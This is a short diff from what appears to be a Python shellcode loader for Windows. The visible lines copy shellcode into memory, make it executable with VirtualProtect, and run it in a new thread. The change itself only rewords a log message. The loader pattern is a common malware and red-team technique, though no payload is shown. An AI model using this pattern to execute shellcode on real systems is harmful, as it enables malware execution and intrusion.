@@ -72,7 +72,7 @@ RtlMoveMemory(heapHandle, shellcode, len(shellcode))
 print('[+] Shellcode copied into memory.')
 
 VirtualProtect(heapHandle, len(shellcode), PAGE_EXECUTE , ctypes.c_ulong(0))
-print('[+] Set RX permissions on memory')
+print('[+] Set Execute only permissions on memory')
 threadHandle = CreateThread(0, 0, heapHandle, 0, 0, 0)
 print('[+] Executed Thread in current process.')
 WaitForSingleObject(threadHandle, 0xFFFFFFFF)
